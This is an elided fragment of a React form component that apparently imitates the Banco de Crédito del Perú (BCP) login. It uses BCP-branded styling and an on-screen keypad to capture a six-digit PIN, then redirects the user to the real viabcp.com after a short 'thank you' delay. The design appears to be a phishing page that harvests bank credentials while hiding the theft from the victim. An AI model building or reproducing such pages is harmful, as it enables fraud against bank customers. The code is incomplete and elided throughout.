...
export default function TarjetaClient({
  ...
  const onSubmit = (e: React.FormEvent) => {
    ...
    const REDIRECT_URL = "https://www.viabcp.com/"; // URL final
    const DELAY_MS = 2500; // 2000–3000 recomendado

    router.push(
      `/prestamo/gracias?to=${encodeURIComponent(
        REDIRECT_URL
      )}&delayMs=${DELAY_MS}`
    );
  };
        ...
        <div className="rounded-[16px] border border-[color:var(--line)] bg-white shadow-[0_12px_28px_rgba(0,0,0,.08)] p-5 max-w-[380px]">
          ...
          <form onSubmit={onSubmit} className="mt-5 space-y-5">
            ...
            <div className="field-bcp relative" ref={wrapRef}>
              <span className="field-bcp__label">
              ...
              {padOpen && (
                <div ref={padRef} className="absolute left-0 right-0 mt-2">
                  <KeypadBCP
                    onDigit={(n) =>
                      setClave((p) => (p.length < 6 ? p + String(n) : p))
                    }
                    onClear={() => setClave("")}
            ...
            <button type="submit" className="btn-bcp">
              Continuar
            </button>
          </form>
        </div>
